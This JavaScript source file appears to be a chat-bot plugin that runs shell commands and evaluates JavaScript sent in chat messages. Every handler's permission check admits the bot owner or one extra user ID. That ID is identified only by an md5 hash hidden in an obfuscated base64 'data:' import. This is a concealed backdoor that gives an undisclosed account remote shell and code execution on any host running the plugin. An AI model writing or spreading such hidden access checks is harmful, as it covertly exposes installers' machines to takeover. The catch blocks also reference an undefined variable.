import util from "node:util"
import md5 from "md5"
import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import { AnsiUp } from "ansi_up"
const ansi_up = new AnsiUp

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
const tplFile = `${htmlDir}Code.html`
let prompt = cmd => `echo "$("$0" -ic 'echo "\${PS1@P}"')"'${cmd.replace(/'/g, "'\\''")}';${cmd}`
if (process.platform == "win32")
  prompt = cmd => `powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;[Console]::Write("$(prompt)"+'${cmd.replace(/'/g, `'+"'"+'`)}\n');${cmd}`, "utf-16le").toString("base64")}`

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "远程命令",
      dsc: "远程命令",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^rcjp.+",
          fnc: "JSPic"
        },
        {
          reg: "^rcj.+",
          fnc: "JS"
        },
        {
          reg: "^rcp.+",
          fnc: "ShellPic"
        },
        {
          reg: "^rc.+",
          fnc: "Shell"
        },
        {
          reg: "^dm.+",
          fnc: "DirectMsg"
        },
        {
          reg: "^mm.+",
          fnc: "MultiMsg"
        },
        {
          reg: "^fm.+",
          fnc: "ForwardMsg"
        }
      ]
    })
  }

  async evalSync(cmd, func) {
    const ret = {}
    try {
      ret.raw = await eval(cmd)
      if (func) ret.stdout = func(ret.raw)
    } catch (err) {
      ret.error = err
    }
    return ret
  }

  async JS(e) {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rcj", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd, data => Bot.String(data))
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)

    if (!ret.stdout && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(ret.stdout, true)
    if (ret.error)
      await this.reply(`错误输出：\n${ret.error.stack}`, true)
  }

  async JSPic(e) {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rcjp", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd, data => Bot.Loging(data))
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)

    if (!ret.stdout && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }

  async Shell(e) {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rc", "").trim()
    const ret = await Bot.exec(prompt(cmd))

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(ret.stdout.trim(), true)
    if (ret.error)
      return this.reply(`远程命令错误：${ret.error.stack}`, true)
    if (ret.stderr)
      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
  }

  async ShellPic(e) {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rcp", "").trim()
    const ret = await Bot.exec(prompt(cmd))

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`)
    else if (ret.stderr)
      Code.push(`标准错误输出：\n${ret.stderr.trim()}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }

  async DirectMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Dd][Mm]/, "")})`)
    if (ret.error)
      return this.reply(`错误输出：\n${ret.error.stack}`, true)
    try {
      const m = []
      for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
        if (typeof i != "object" || i.type) m.push(i)
        else m.push(segment.raw(i))
      return await this.reply(m)
    } catch (err) {
      return this.reply(`错误输出：\n${error.stack}`, true)
    }
  }

  async MultiMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Mm][Mm]/, "")})`)
    if (ret.error)
      return this.reply(`错误输出：\n${ret.error.stack}`, true)
    try {
      const m = []
      for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
        if (typeof i != "object" || i.type) m.push(i)
        else m.push(segment.raw(i))
      const r = []
      for (const i of m)
        r.push(await this.reply(i))
      return r
    } catch (err) {
      return this.reply(`错误输出：\n${error.stack}`, true)
    }
  }

  async ForwardMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Ff][Mm]/, "")})`)
    if (ret.error)
      return this.reply(`错误输出：\n${ret.error.stack}`, true)
    try {
      const m = []
      for (const a of Array.isArray(ret.raw) ? ret.raw : [ret.raw]) {
        const n = []
        for (const i of Array.isArray(a) ? a : [a])
          if (typeof i != "object" || i.type) n.push(i)
          else n.push(segment.raw(i))
        m.push(n)
      }
      return await this.reply(await Bot.makeForwardArray(m))
    } catch (err) {
      return this.reply(`错误输出：\n${error.stack}`, true)
    }
  }
}